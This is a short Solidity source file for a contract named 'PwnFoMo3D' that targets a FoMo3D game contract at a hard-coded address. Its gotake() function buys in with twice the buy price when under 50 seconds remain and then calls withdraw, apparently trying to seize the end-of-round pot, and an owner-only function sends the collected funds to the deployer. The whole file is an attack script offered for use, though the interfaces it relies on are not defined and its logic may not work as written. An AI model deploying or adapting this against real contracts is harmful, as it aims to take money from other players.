pragma solidity ^0.4.24;





contract PwnFoMo3D is Owned {
    FoMo3DlongInterface fomo3d;
  constructor() public payable {
     fomo3d  = FoMo3DlongInterface(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5);
  }
  
  function gotake() public  {
    // Link up the fomo3d contract and ensure this whole thing is worth it
    
    if (fomo3d.getTimeLeft() > 50) {
      revert();
    }

    address(fomo3d).call.value( fomo3d.getBuyPrice() *2 )();
    
    fomo3d.withdraw();
  }
  
    function withdrawOwner(uint256 a)  public onlyOwner {
        msg.sender.transfer(a);    
    }
}